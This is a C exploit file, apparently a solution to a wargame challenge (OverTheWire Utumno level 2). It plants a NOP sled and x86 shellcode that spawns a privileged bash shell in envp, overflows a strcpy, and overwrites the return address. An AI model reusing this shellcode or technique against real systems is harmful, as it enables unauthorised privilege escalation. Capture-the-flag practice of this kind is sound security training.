#include <unistd.h>

void main() {
	//    0x0804846b <+32>:    mov    eax,DWORD PTR [ebp+0xc]
	//    0x0804846e <+35>:    add    eax,0x28
	// Because we have this instructions that will move the eax to tenth element of envp and then copy it with strcpy
	// cyclic -l 0x61616165 will show you the offset from `strace ./my_execve`
	// Now, you can just place a shellcode in one of the elements of envp before tenth element
        char *envp[] = {"", "", "", "", "", "", "", "", "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80", "AAAAAAAAAAAAAAAA\xb0\xdf\xff\xff", NULL};
	execve("/utumno/utumno2", NULL, envp);
}

